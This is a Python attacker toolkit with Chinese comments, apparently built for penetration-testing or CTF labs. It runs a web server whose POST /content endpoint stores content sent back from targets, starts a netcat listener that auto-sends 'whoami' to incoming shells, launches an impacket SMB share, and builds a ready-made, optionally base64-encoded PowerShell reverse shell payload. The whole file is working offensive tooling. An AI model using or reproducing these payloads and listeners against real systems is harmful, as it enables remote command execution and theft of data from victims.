import threading
import socket
import fcntl
import struct
import os
import subprocess
import sys
import pty
import time
import base64
import ssl
import urllib.parse
from http.server import SimpleHTTPRequestHandler, HTTPServer

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15].encode('utf-8'))
    )[20:24])

# Web Server
top100 = []
class CustomHandler(SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        # 獲取客戶端 IP 和請求的時間戳
        client_ip = self.client_address[0]
        timestamp = time.strftime("%d/%b/%Y %H:%M:%S", time.gmtime())
        # 印出模擬原生格式的請求記錄
        msg = f"{client_ip} - - [{timestamp}] \"{self.requestline}\" {code} {size} - {self.headers['User-Agent']}"
        print(msg)
        if len(top100) < 100:
            top100.append(msg)
        else:
            top100.pop(0)
            top100.append(msg)

    def do_POST(self):
        # 檢查是否為 POST /content 請求
        if self.path == '/content':
            save_folder = 'save'
            if save_folder not in os.listdir('.'):
                os.mkdir(save_folder)

            # 獲取請求的 Content-Length
            content_length = int(self.headers.get('Content-Length', 0))
            # 讀取 POST 資料
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed_data = urllib.parse.parse_qs(post_data, keep_blank_values=True)
            # 提取 url 和 content 參數
            url = parsed_data.get('url', [''])[0]  # 獲取第一個 url 值，預設為空字串
            content = parsed_data.get('content', [''])[0]  # 獲取第一個 content 值，預設為空字串

            if url.strip() != '':
                filename = url.split('?')[0].split('/')[-1]
                param = url.split('?')[1] if '?' in url else ''
                param = param.replace('/', '_')
                filename = filename + '?' + param + '.html'
                
                with open(os.path.join(save_folder, filename), 'w') as f:
                    f.write(content)
                    
                with open('post.log', 'a') as f:
                    f.write(f"{url}\n")
            
            # 設定回應狀態碼和標頭
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            
            # 回應內容
            response = f"Received your POST request at /content with data: {post_data}"
            self.wfile.write(response.encode('utf-8'))
        else:
            # 對於其他 POST 請求，回應 404
            self.send_response(404)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Endpoint not found")

    def log_error(self, format, *args):
        # 與 log_request() 相同邏輯，只是這裡是記錄錯誤事件
        client_ip = self.client_address[0]
        timestamp = time.strftime("%d/%b/%Y %H:%M:%S", time.gmtime())
        error_msg = format % args

        msg = f"{client_ip} - - [{timestamp}] {error_msg}"

def generate_self_signed_cert(certfile='server.crt', keyfile='server.key'):
    """生成自簽證書和私鑰（如果檔案不存在）"""
    if os.path.exists(certfile) and os.path.exists(keyfile):
        print(f"[+] Using existing certificate: {certfile} and key: {keyfile}")
        return
    
    print("[+] Generating self-signed certificate...")
    try:
        # 使用 openssl 命令生成自簽證書
        subprocess.run([
            'openssl', 'req', '-x509', '-newkey', 'rsa:2048',
            '-keyout', keyfile, '-out', certfile, '-days', '365', '-nodes',
            '-subj', '/CN=localhost'
        ], check=True)
        print(f"[+] Certificate generated: {certfile}, Key: {keyfile}")
        
        # 設置私鑰檔案權限（僅擁有者可讀寫）
        os.chmod(keyfile, 0o600)
    except subprocess.CalledProcessError as e:
        raise Exception(f"Failed to generate certificate: {e}")
    except FileNotFoundError:
        raise Exception("OpenSSL not found. Please ensure OpenSSL is installed.")

def run_server(host='localhost', port=80, directory=os.getcwd(), use_https=False, certfile='server.crt', keyfile='server.key'):
    # 設定工作目錄
    os.chdir(directory)
    # 設定伺服器地址和端口
    server_address = (host, port)
    httpd = HTTPServer(server_address, CustomHandler)
    
    # 如果啟用 HTTPS
    if use_https:
        # 確保使用 443 端口（或自定義 HTTPS 端口）
        if port == 80:
            server_address = (host, 443)
            httpd = HTTPServer(server_address, CustomHandler)
        
        # 生成或使用現有證書
        generate_self_signed_cert(certfile, keyfile)
        
        # 包裝 socket 以使用 SSL/TLS
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        context.load_cert_chain(certfile=certfile, keyfile=keyfile)
        httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
        protocol = "HTTPS"
    else:
        protocol = "HTTP"
    
    print(f"[+] {protocol} Server: {protocol.lower()}://{host}:{server_address[1]}")
    httpd.serve_forever()

def start_web_server(host='0.0.0.0', port=80, directory=os.getcwd(), use_https=False):
    # 使用子執行緒運行伺服器
    server_thread = threading.Thread(
        target=run_server, 
        args=(host, port, directory, use_https), 
        daemon=True
    )
    server_thread.start()
    # print(f"[+] 已啟動 Web 伺服器執行緒於 {host}:{port}，服務目錄: {directory}")

# Netcat
def run_netcat(port=443, auto_command="whoami\n"):
    # 使用 pty 創建主從終端機對
    master_fd, slave_fd = pty.openpty()
    
    # 啟動 nc，將其 stdin/stdout/stderr 連接到 slave_fd
    process = subprocess.Popen(
        ["nc", "-lvvp", str(port)],
        stdin=slave_fd,
        stdout=slave_fd,
        stderr=slave_fd,
        text=True,
        env=os.environ.copy()  # 確保環境變數一致
    )
    
    # 關閉 slave_fd，因為它已被 process 使用
    os.close(slave_fd)

    # 處理 nc 的輸出
    def handle_output():
        first_input_detected = False
        while True:
            try:
                line = os.read(master_fd, 1024).decode('utf-8')
                if not line:
                    break
                print(line, end='')
                
                if not first_input_detected and 'connect' in line:
                    first_input_detected = True
                    print(f'[+] Sending command: {auto_command}')
                    os.write(master_fd, auto_command.encode('utf-8'))  # 自動發送一條指令
                    
            except OSError:
                break
        os.close(master_fd)

    # 在執行緒中處理輸出
    output_thread = threading.Thread(target=handle_output, daemon=True)
    output_thread.start()

    # 主執行緒處理輸入
    try:
        while True:
            user_input = input("") + "\n"
            if process.poll() is not None:  # 檢查 nc 是否結束
                break
            os.write(master_fd, user_input.encode('utf-8'))  # 發送輸入
    except KeyboardInterrupt:
        print("\n結束 nc 連線...")
    finally:
        process.terminate()

def start_netcat_thread(port=443):
    nc_thread = threading.Thread(target=run_netcat, args=(port,), daemon=True)
    nc_thread.start()
    print(f"[+] NC listening on {port}")
    return nc_thread

def run_smb_server(share_name='shares', share_path='.'):
    print(f"SMB Server: {share_name} -> {share_path}")
    proc = subprocess.Popen(
        f"impacket-smbserver {share_name} {share_path}",
        shell=True
    )
    try:
        proc.wait()  # 等待 SMB 結束
    except KeyboardInterrupt:
        print("[-] Stop SMB Server")
        proc.terminate()
        proc.wait()

def start_smb_server_thread(share_name='shares', share_path='.'):
    smb_thread = threading.Thread(target=run_smb_server, args=(share_name, share_path), daemon=True)
    smb_thread.start()
    return smb_thread

def gen_powershell_rev(ip, port, base64encode=False):
    payload = '$client = New-Object System.Net.Sockets.TCPClient("%s",%d);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    payload = payload % (ip, port)
    if base64encode:
        return base64.b64encode(payload.encode('utf16')[2:]).decode()
    return payload

# 範例使用方式
if __name__ == "__main__":
    ip = get_ip_address('tun0')  # 注意：這裡修改為字符串，因為 struct.pack 需要 bytes
    print('IP Address:', ip)
    # 指定特定目錄，例如 '/path/to/your/directory'
    custom_directory = "./"  # 可替換成你想要的目錄
    start_web_server('0.0.0.0', 80, custom_directory, False)
    while True:
        try:
            pass
        except KeyboardInterrupt as e:
            sys.exit(0)